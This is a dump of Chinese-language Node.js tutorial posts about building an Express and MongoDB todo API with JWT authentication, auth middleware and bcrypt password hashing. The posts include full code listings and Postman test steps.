&#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//更新app.patch('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; var body = _.pick(req.body, ['text', 'completed']); if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; if (_.isBoolean(body.completed) &amp;&amp; body.completed) &#123; body.completedAt = new Date().getTime(); &#125; else &#123; body.completed = false; body.completedAt = null; &#125; Todo.findByIdAndUpdate(id, &#123;$set: body&#125;, &#123;new: true&#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;)&#125;);//监听app.listen(port,()=&gt;&#123; console.log(`Start on port $&#123;port&#125;`);&#125;);module.exports = &#123; app, Todo&#125; 测试 123456789101112131415161718192021221、打开mongoDB &gt; ./mongod -dbpath /Users/jackson/Downloads/mongodb-data2、运行 &gt;node postman.js3、打开postman 选择post 输入 &gt;localhost:3000/users 保存userBody中填入：&#123; &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;, &quot;password&quot; : &quot;123abc!&quot;&#125;返回：&#123; &quot;_id&quot;: &quot;5bfe716591e78c6a4ad8c164&quot;, &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;&#125;header:x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr84、 选择delete 输入 &gt;localhost:3000/users/me/token header附带返回：x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr8完成删除。","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[28]-mongodb+express+middleware验证用户登陆信息","slug":"node-28-mongodb-user-login","date":"2018-11-29T09:37:03.000Z","updated":"2018-11-30T03:11:37.428Z","comments":true,"path":"2018/11/29/node-28-mongodb-user-login/","link":"","permalink":"https://dreamerjonson.com/2018/11/29/node-28-mongodb-user-login/","excerpt":"","text":"登陆验证 用户使用邮箱和密码登陆，与mongodb数据库查找 验证用户是否有效 首先用户存在，并且密码匹配。 1234567891011121314151617181920UserSchema.statics.findByCredentials = function (email, password) &#123; var User = this; return User.findOne(&#123;email&#125;).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; return new Promise((resolve, reject) =&gt; &#123; // Use bcrypt.compare to compare password and user.password bcrypt.compare(password, user.password, (err, res) =&gt; &#123; if (res) &#123; resolve(user); &#125; else &#123; reject(); &#125; &#125;); &#125;); &#125;);&#125;; url 登陆成功header也会返回access toekn 123456789101112// POST /users/login &#123;email, password&#125;app.post('/users/login', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); User.findByCredentials(body.email, body.password).then((user) =&gt; &#123; return user.generateAuthToken().then((token) =&gt; &#123; res.header('x-auth', token).send(user); &#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;); 完整代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303var mongoose = require('mongoose');var express = require('express');var bodyParser = require('body-parser');const &#123;ObjectID&#125; = require('mongodb');var _ = require('lodash');const validator = require('validator');const jwt = require('jsonwebtoken');const bcrypt = require('bcryptjs');//appvar app = express();const port = process.env.PORT || 3000;//express middleware Jonson对象与字符串转换。app.use(bodyParser.json());//mongoose.Promise = global.Promise;//连接mogodbmongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/TodoApp');//模版var Todo = mongoose.model('Todo',&#123; text:&#123; type:String, //类型 required:true, //必须要有 minlength:1, //最小长度 trim:true //去除空格 &#125;, completed:&#123; type:Boolean, default:false //默认值 &#125;, completedAt:&#123; type:Number, default:null &#125;&#125;);var UserSchema = new mongoose.Schema(&#123; email: &#123; type: String, required: true, trim: true, minlength: 1, unique: true, validate: &#123; validator: validator.isEmail, message: '&#123;VALUE&#125; is not a valid email' &#125; &#125;, password: &#123; type: String, require: true, minlength: 6 &#125;, tokens: [&#123; access: &#123; type: String, required: true &#125;, token: &#123; type: String, required: true &#125; &#125;]&#125;);UserSchema.methods.toJSON = function () &#123; var user = this; var userObject = user.toObject(); return _.pick(userObject, ['_id', 'email']);&#125;;UserSchema.methods.generateAuthToken = function () &#123; var user = this; var access = 'auth'; var token = jwt.sign(&#123;_id: user._id.toHexString(), access&#125;, 'abc123').toString(); user.tokens = user.tokens.concat([&#123;access,token&#125;]); return user.save().then(() =&gt; &#123; return token; //返回token &#125;);&#125;;UserSchema.statics.findByToken = function (token) &#123; var User = this; var decoded; try &#123; decoded = jwt.verify(token, 'abc123'); &#125; catch (e) &#123; return Promise.reject(); &#125; return User.findOne(&#123; '_id': decoded._id, 'tokens.token': token, 'tokens.access': 'auth' &#125;);&#125;;UserSchema.statics.findByCredentials = function (email, password) &#123; var User = this; return User.findOne(&#123;email&#125;).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; return new Promise((resolve, reject) =&gt; &#123; // Use bcrypt.compare to compare password and user.password bcrypt.compare(password, user.password, (err, res) =&gt; &#123; if (res) &#123; resolve(user); &#125; else &#123; reject(); &#125; &#125;); &#125;); &#125;);&#125;;//在保存之前执行操作。UserSchema.pre('save', function (next) &#123; var user = this;//保存时对于密码的更新 if (user.isModified('password')) &#123; bcrypt.genSalt(10, (err, salt) =&gt; &#123; //密码变为了hash bcrypt.hash(user.password, salt, (err, hash) =&gt; &#123; user.password = hash; next(); &#125;); &#125;); &#125; else &#123; next(); &#125;&#125;);var User = mongoose.model('User', UserSchema);//auth middlewirevar authenticate = (req, res, next) =&gt; &#123; var token = req.header('x-auth'); User.findByToken(token).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; req.user = user; req.token = token; next(); &#125;).catch((e) =&gt; &#123; res.status(401).send(); &#125;);&#125;;app.get('/users/me', authenticate, (req, res) =&gt; &#123; res.send(req.user);&#125;);// POST /users/login &#123;email, password&#125;app.post('/users/login', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); User.findByCredentials(body.email, body.password).then((user) =&gt; &#123; return user.generateAuthToken().then((token) =&gt; &#123; res.header('x-auth', token).send(user); &#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);// POST /usersapp.post('/users', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); var user = new User(body); user.save().then(() =&gt; &#123; return user.generateAuthToken(); //调用方法，产生auth token并保存。 &#125;).then((token) =&gt; &#123; res.header('x-auth', token).send(user); //设置了响应头 &#125;).catch((e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//express routeapp.post('/todos',(req,res)=&gt;&#123;// console.log(req.body); //建立对象document var todo = new Todo(&#123; text:req.body.text &#125;); //保存 todo.save().then((doc)=&gt;&#123; res.send(doc); &#125;,(e)=&gt;&#123; res.status(400).send(e); &#125;);&#125;)//获取所有属性app.get('/todos', (req, res) =&gt; &#123; Todo.find().then((todos) =&gt; &#123; res.send(&#123;todos&#125;); &#125;, (e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//查询idapp.get('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findById(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//删除app.delete('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findByIdAndRemove(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//更新app.patch('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; var body = _.pick(req.body, ['text', 'completed']); if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; if (_.isBoolean(body.completed) &amp;&amp; body.completed) &#123; body.completedAt = new Date().getTime(); &#125; else &#123; body.completed = false; body.completedAt = null; &#125; Todo.findByIdAndUpdate(id, &#123;$set: body&#125;, &#123;new: true&#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;)&#125;);//监听app.listen(port,()=&gt;&#123; console.log(`Start on port $&#123;port&#125;`);&#125;);module.exports = &#123; app, Todo&#125; 测试 123456789101112131415161718192021222324252627282930311、打开mongoDB &gt; ./mongod -dbpath /Users/jackson/Downloads/mongodb-data2、运行 &gt;node postman.js3、打开postman 选择post 输入 &gt;localhost:3000/users 保存userBody中填入：&#123; &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;, &quot;password&quot; : &quot;123abc!&quot;&#125;返回：&#123; &quot;_id&quot;: &quot;5bfe716591e78c6a4ad8c164&quot;, &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;&#125;header:x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr84、 选择post 输入 &gt;localhost:3000/login 登陆userBody中填入：&#123; &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;, &quot;password&quot; : &quot;123abc!&quot;&#125;返回：&#123; &quot;_id&quot;: &quot;5bfe716591e78c6a4ad8c164&quot;, &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;&#125;header附带返回：x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr8","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[27]-express+mongodb+middleware实现密码哈希","slug":"node-27-mongodb-password-hash","date":"2018-11-29T02:56:55.000Z","updated":"2018-11-30T03:11:40.710Z","comments":true,"path":"2018/11/29/node-27-mongodb-password-hash/","link":"","permalink":"https://dreamerjonson.com/2018/11/29/node-27-mongodb-password-hash/","excerpt":"","text":"保存密码前对密码进行hash 123456789101112131415UserSchema.pre('save', function (next) &#123; var user = this; if (user.isModified('password')) &#123; bcrypt.genSalt(10, (err, salt) =&gt; &#123; bcrypt.hash(user.password, salt, (err, hash) =&gt; &#123; user.password = hash; next(); &#125;); &#125;); &#125; else &#123; next(); &#125;&#125;); 完整代码var mongoose = require('mongoose');var express = require('express');var bodyParser = require('body-parser');const &#123;ObjectID&#125; = require('mongodb');var _ = require('lodash');const validator = require('validator');const jwt = require('jsonwebtoken');const bcrypt = require('bcryptjs');//appvar app = express();const port = process.env.PORT || 3000;//express middleware Jonson对象与字符串转换。app.use(bodyParser.json());//mongoose.Promise = global.Promise;//连接mogodbmongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/TodoApp');//模版var Todo = mongoose.model('Todo',&#123; text:&#123; type:String, //类型 required:true, //必须要有 minlength:1, //最小长度 trim:true //去除空格 &#125;, completed:&#123; type:Boolean, default:false //默认值 &#125;, completedAt:&#123; type:Number, default:null &#125;&#125;);var UserSchema = new mongoose.Schema(&#123; email: &#123; type: String, required: true, trim: true, minlength: 1, unique: true, validate: &#123; validator: validator.isEmail, message: '&#123;VALUE&#125; is not a valid email' &#125; &#125;, password: &#123; type: String, require: true, minlength: 6 &#125;, tokens: [&#123; access: &#123; type: String, required: true &#125;, token: &#123; type: String, required: true &#125; &#125;]&#125;);UserSchema.methods.toJSON = function () &#123; var user = this; var userObject = user.toObject(); return _.pick(userObject, ['_id', 'email']);&#125;;UserSchema.methods.generateAuthToken = function () &#123; var user = this; var access = 'auth'; var token = jwt.sign(&#123;_id: user._id.toHexString(), access&#125;, 'abc123').toString(); user.tokens = user.tokens.concat([&#123;access,token&#125;]); return user.save().then(() =&gt; &#123; return token; //返回token &#125;);&#125;;UserSchema.statics.findByToken = function (token) &#123; var User = this; var decoded; try &#123; decoded = jwt.verify(token, 'abc123'); &#125; catch (e) &#123; return Promise.reject(); &#125; return User.findOne(&#123; '_id': decoded._id, 'tokens.token': token, 'tokens.access': 'auth' &#125;);&#125;;//在保存之前执行操作。UserSchema.pre('save', function (next) &#123; var user = this;//保存时对于密码的更新 if (user.isModified('password')) &#123; bcrypt.genSalt(10, (err, salt) =&gt; &#123; //密码变为了hash bcrypt.hash(user.password, salt, (err, hash) =&gt; &#123; user.password = hash; next(); &#125;); &#125;); &#125; else &#123; next(); &#125;&#125;);var User = mongoose.model('User', UserSchema);//auth middlewirevar authenticate = (req, res, next) =&gt; &#123; var token = req.header('x-auth'); User.findByToken(token).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; req.user = user; req.token = token; next(); &#125;).catch((e) =&gt; &#123; res.status(401).send(); &#125;);&#125;;app.get('/users/me', authenticate, (req, res) =&gt; &#123; res.send(req.user);&#125;);//express routeapp.post('/todos',(req,res)=&gt;&#123;// console.log(req.body); //建立对象document var todo = new Todo(&#123; text:req.body.text &#125;); //保存 todo.save().then((doc)=&gt;&#123; res.send(doc); &#125;,(e)=&gt;&#123; res.status(400).send(e); &#125;);&#125;)//获取所有属性app.get('/todos', (req, res) =&gt; &#123; Todo.find().then((todos) =&gt; &#123; res.send(&#123;todos&#125;); &#125;, (e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//查询idapp.get('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findById(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//删除app.delete('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findByIdAndRemove(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//更新app.patch('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; var body = _.pick(req.body, ['text', 'completed']); if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; if (_.isBoolean(body.completed) &amp;&amp; body.completed) &#123; body.completedAt = new Date().getTime(); &#125; else &#123; body.completed = false; body.completedAt = null; &#125; Todo.findByIdAndUpdate(id, &#123;$set: body&#125;, &#123;new: true&#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;)&#125;);// POST /usersapp.post('/users', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); var user = new User(body); user.save().then(() =&gt; &#123; return user.generateAuthToken(); //调用方法，产生auth token并保存。 &#125;).then((token) =&gt; &#123; res.header('x-auth', token).send(user); //设置了响应头 &#125;).catch((e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//监听app.listen(port,()=&gt;&#123; console.log(`Start on port $&#123;port&#125;`);&#125;);module.exports = &#123; app, Todo&#125; 测试 1234567891011121314151617181、打开mongoDB &gt; ./mongod -dbpath /Users/jackson/Downloads/mongodb-data2、运行 &gt;node postman.js3、打开postman 选择post 输入 &gt;localhost:3000/usersBody中填入：&#123; &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;, &quot;password&quot; : &quot;123abc!&quot;&#125;返回：&#123; &quot;_id&quot;: &quot;5bfe716591e78c6a4ad8c164&quot;, &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;&#125;header:x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr84、查看studio 3T 发现密码变为了hash之后的数字。","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[26]-bcryptjs库实现密码哈希","slug":"node-26-password-hash","date":"2018-11-29T01:53:17.000Z","updated":"2018-11-29T03:17:23.107Z","comments":true,"path":"2018/11/29/node-26-password-hash/","link":"","permalink":"https://dreamerjonson.com/2018/11/29/node-26-password-hash/","excerpt":"","text":"加密 防撞库 1&gt; npm install --save bcryptjs 12345678910111213141516const bcrypt = require('bcryptjs')var password = '123abc!';//加密， salt password 是为了防止撞库攻击、密码概率攻击bcrypt.genSalt(10, (err, salt) =&gt; &#123; bcrypt.hash(password, salt, (err, hash) =&gt; &#123; console.log(hash); &#125;);&#125;);//解密var hashedPassword = '$2a$10$huAU4qTnQuGPifHEXfV9cOmPJ7p61oKaoXrY1WviiDAznE/rW8oLK';bcrypt.compare('123abc!', hashedPassword, (err, res) =&gt; &#123; console.log(res);&#125;);","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[25]-express-middleware+mongoDB实现用户权限验证","slug":"node-25-auth-middleware","date":"2018-11-28T16:15:41.000Z","updated":"2018-11-29T03:16:48.440Z","comments":true,"path":"2018/11/29/node-25-auth-middleware/","link":"","permalink":"https://dreamerjonson.com/2018/11/29/node-25-auth-middleware/","excerpt":"","text":"查找token 查找数据库Token是否存在 12345678910111213141516UserSchema.statics.findByToken = function (token) &#123; var User = this; var decoded; try &#123; decoded = jwt.verify(token, 'abc123'); &#125; catch (e) &#123; return Promise.reject(); &#125; return User.findOne(&#123; '_id': decoded._id, 'tokens.token': token, 'tokens.access': 'auth' &#125;);&#125;; auth-middleware 12345678910111213141516//auth middlewire,代码重用性高。var authenticate = (req, res, next) =&gt; &#123; var token = req.header('x-auth'); User.findByToken(token).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; req.user = user; req.token = token; next(); &#125;).catch((e) =&gt; &#123; res.status(401).send(); &#125;);&#125;; url 123app.get('/users/me', authenticate, (req, res) =&gt; &#123; res.send(req.user);&#125;); 完整代码 postman.jsvar mongoose = require('mongoose');var express = require('express');var bodyParser = require('body-parser');const &#123;ObjectID&#125; = require('mongodb');var _ = require('lodash');const validator = require('validator');const jwt = require('jsonwebtoken');//appvar app = express();const port = process.env.PORT || 3000;//express middleware Jonson对象与字符串转换。app.use(bodyParser.json());//mongoose.Promise = global.Promise;//连接mogodbmongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/TodoApp');//模版var Todo = mongoose.model('Todo',&#123; text:&#123; type:String, //类型 required:true, //必须要有 minlength:1, //最小长度 trim:true //去除空格 &#125;, completed:&#123; type:Boolean, default:false //默认值 &#125;, completedAt:&#123; type:Number, default:null &#125;&#125;);var UserSchema = new mongoose.Schema(&#123; email: &#123; type: String, required: true, trim: true, minlength: 1, unique: true, validate: &#123; validator: validator.isEmail, message: '&#123;VALUE&#125; is not a valid email' &#125; &#125;, password: &#123; type: String, require: true, minlength: 6 &#125;, tokens: [&#123; access: &#123; type: String, required: true &#125;, token: &#123; type: String, required: true &#125; &#125;]&#125;);UserSchema.methods.toJSON = function () &#123; var user = this; var userObject = user.toObject(); return _.pick(userObject, ['_id', 'email']);&#125;;UserSchema.methods.generateAuthToken = function () &#123; var user = this; var access = 'auth'; var token = jwt.sign(&#123;_id: user._id.toHexString(), access&#125;, 'abc123').toString(); user.tokens = user.tokens.concat([&#123;access,token&#125;]); return user.save().then(() =&gt; &#123; return token; //返回token &#125;);&#125;;UserSchema.statics.findByToken = function (token) &#123; var User = this; var decoded; try &#123; decoded = jwt.verify(token, 'abc123'); &#125; catch (e) &#123; return Promise.reject(); &#125; return User.findOne(&#123; '_id': decoded._id, 'tokens.token': token, 'tokens.access': 'auth' &#125;);&#125;;var User = mongoose.model('User', UserSchema);//auth middlewirevar authenticate = (req, res, next) =&gt; &#123; var token = req.header('x-auth'); User.findByToken(token).then((user) =&gt; &#123; if (!user) &#123; return Promise.reject(); &#125; req.user = user; req.token = token; next(); &#125;).catch((e) =&gt; &#123; res.status(401).send(); &#125;);&#125;;app.get('/users/me', authenticate, (req, res) =&gt; &#123; res.send(req.user);&#125;);//express routeapp.post('/todos',(req,res)=&gt;&#123;// console.log(req.body); //建立对象document var todo = new Todo(&#123; text:req.body.text &#125;); //保存 todo.save().then((doc)=&gt;&#123; res.send(doc); &#125;,(e)=&gt;&#123; res.status(400).send(e); &#125;);&#125;)//获取所有属性app.get('/todos', (req, res) =&gt; &#123; Todo.find().then((todos) =&gt; &#123; res.send(&#123;todos&#125;); &#125;, (e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//查询idapp.get('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findById(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//删除app.delete('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findByIdAndRemove(id).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;);&#125;);//更新app.patch('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; var body = _.pick(req.body, ['text', 'completed']); if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; if (_.isBoolean(body.completed) &amp;&amp; body.completed) &#123; body.completedAt = new Date().getTime(); &#125; else &#123; body.completed = false; body.completedAt = null; &#125; Todo.findByIdAndUpdate(id, &#123;$set: body&#125;, &#123;new: true&#125;).then((todo) =&gt; &#123; if (!todo) &#123; return res.status(404).send(); &#125; res.send(&#123;todo&#125;); &#125;).catch((e) =&gt; &#123; res.status(400).send(); &#125;)&#125;);// POST /usersapp.post('/users', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); var user = new User(body); user.save().then(() =&gt; &#123; return user.generateAuthToken(); //调用方法，产生auth token并保存。 &#125;).then((token) =&gt; &#123; res.header('x-auth', token).send(user); //设置了响应头 &#125;).catch((e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//监听app.listen(port,()=&gt;&#123; console.log(`Start on port $&#123;port&#125;`);&#125;);module.exports = &#123; app, Todo&#125; 测试 12345678910111213141516171819202122232425261、打开mongoDB &gt; ./mongod -dbpath /Users/jackson/Downloads/mongodb-data2、运行 &gt;node postman.js3、打开postman 选择post 输入 &gt;localhost:3000/usersBody中填入：&#123; &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;, &quot;password&quot; : &quot;123abc!&quot;&#125;返回：&#123; &quot;_id&quot;: &quot;5bfe716591e78c6a4ad8c164&quot;, &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;&#125;header:x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr84、localhost:3000/users/me增加header：x-auth →eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1YmZlNzE2NTkxZTc4YzZhNGFkOGMxNjQiLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNTQzNDAxODI5fQ.wOKNzkls_w_jA5YVkCo0r9gFZ4-KtD6GarRiCDpAPr8查询后返回：&#123; &quot;_id&quot;: &quot;5bfe716591e78c6a4ad8c164&quot;, &quot;email&quot;: &quot;zhuimengshaonian07@gmail.com&quot;&#125;","categories":[{"name":"nodejs","slug":"nodejs","permalink":"https://dreamerjonson.com/categories/nodejs/"}],"tags":[{"name":"nodejs 前端","slug":"nodejs-前端","permalink":"https://dreamerjonson.com/tags/nodejs-前端/"}]},{"title":"nodejs渐入佳境[24]-用户权限-express+mongoDB+authtoken","slug":"node-24-auth-token","date":"2018-11-28T10:17:23.000Z","updated":"2018-11-29T03:15:46.326Z","comments":true,"path":"2018/11/28/node-24-auth-token/","link":"","permalink":"https://dreamerjonson.com/2018/11/28/node-24-auth-token/","excerpt":"","text":"设置用户模版 12345678910111213141516171819202122232425262728293031323334353637383940414243var UserSchema = new mongoose.Schema(&#123; email: &#123; type: String, required: true, trim: true, minlength: 1, unique: true, validate: &#123; validator: validator.isEmail, message: '&#123;VALUE&#125; is not a valid email' &#125; &#125;, password: &#123; type: String, require: true, minlength: 6 &#125;, tokens: [&#123; access: &#123; type: String, required: true &#125;, token: &#123; type: String, required: true &#125; &#125;]&#125;);UserSchema.methods.generateAuthToken = function () &#123; var user = this; var access = 'auth'; //产生token var token = jwt.sign(&#123;_id: user._id.toHexString(), access&#125;, 'abc123').toString();//toekn添加到user中 user.tokens = user.tokens.concat([&#123;access,token&#125;]);//从新保存到数据库中 return user.save().then(() =&gt; &#123; return token; //返回token &#125;);&#125;;var User = mongoose.model('User', UserSchema); 访问url 保存数据 123456789101112app.post('/users', (req, res) =&gt; &#123; var body = _.pick(req.body, ['email', 'password']); var user = new User(body); user.save().then(() =&gt; &#123; return user.generateAuthToken(); //调用方法，产生auth token并保存。 &#125;).then((token) =&gt; &#123; res.header('x-auth', token).send(user); //设置了响应头 &#125;).catch((e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;); 完整代码var mongoose = require('mongoose');var express = require('express');var bodyParser = require('body-parser');const &#123;ObjectID&#125; = require('mongodb');var _ = require('lodash');const validator = require('validator');const jwt = require('jsonwebtoken');//appvar app = express();const port = process.env.PORT || 3000;//express middleware Jonson对象与字符串转换。app.use(bodyParser.json());//mongoose.Promise = global.Promise;//连接mogodbmongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/TodoApp');//模版var Todo = mongoose.model('Todo',&#123; text:&#123; type:String, //类型 required:true, //必须要有 minlength:1, //最小长度 trim:true //去除空格 &#125;, completed:&#123; type:Boolean, default:false //默认值 &#125;, completedAt:&#123; type:Number, default:null &#125;&#125;);var UserSchema = new mongoose.Schema(&#123; email: &#123; type: String, required: true, trim: true, minlength: 1, unique: true, validate: &#123; validator: validator.isEmail, message: '&#123;VALUE&#125; is not a valid email' &#125; &#125;, password: &#123; type: String, require: true, minlength: 6 &#125;, tokens: [&#123; access: &#123; type: String, required: true &#125;, token: &#123; type: String, required: true &#125; &#125;]&#125;);UserSchema.methods.toJSON = function () &#123; var user = this; var userObject = user.toObject(); return _.pick(userObject, ['_id', 'email']);&#125;;UserSchema.methods.generateAuthToken = function () &#123; var user = this; var access = 'auth'; var token = jwt.sign(&#123;_id: user._id.toHexString(), access&#125;, 'abc123').toString(); user.tokens = user.tokens.concat([&#123;access,token&#125;]); return user.save().then(() =&gt; &#123; return token; //返回token &#125;);&#125;;var User = mongoose.model('User', UserSchema);//express routeapp.post('/todos',(req,res)=&gt;&#123;// console.log(req.body); //建立对象document var todo = new Todo(&#123; text:req.body.text &#125;); //保存 todo.save().then((doc)=&gt;&#123; res.send(doc); &#125;,(e)=&gt;&#123; res.status(400).send(e); &#125;);&#125;)//获取所有属性app.get('/todos', (req, res) =&gt; &#123; Todo.find().then((todos) =&gt; &#123; res.send(&#123;todos&#125;); &#125;, (e) =&gt; &#123; res.status(400).send(e); &#125;)&#125;);//查询idapp.get('/todos/:id', (req, res) =&gt; &#123; var id = req.params.id; if (!ObjectID.isValid(id)) &#123; return res.status(404).send(); &#125; Todo.findById(id).then((todo) 